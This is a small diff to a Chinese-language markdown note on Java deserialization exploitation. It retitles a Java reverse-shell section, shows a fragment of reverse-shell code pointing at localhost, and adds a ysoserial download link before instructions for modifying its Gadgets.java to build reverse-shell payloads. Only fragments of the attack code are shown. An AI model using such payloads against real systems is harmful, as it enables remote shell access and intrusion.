@@ -30,7 +30,7 @@ public class 10837093162496 extends AbstractTranslet {
 }
 ```
 
-## 反弹shell
+## java 反弹shell
 
 ```
 String host = "127.0.0.1";
@@ -59,6 +59,8 @@ s.close();
 ```
 
 ## ys 改造反弹shell
+
+`https://codeload.github.com/frohoff/ysoserial/zip/master`
 
 修改 `ysoserial/payloads/util/Gadgets.java`
 
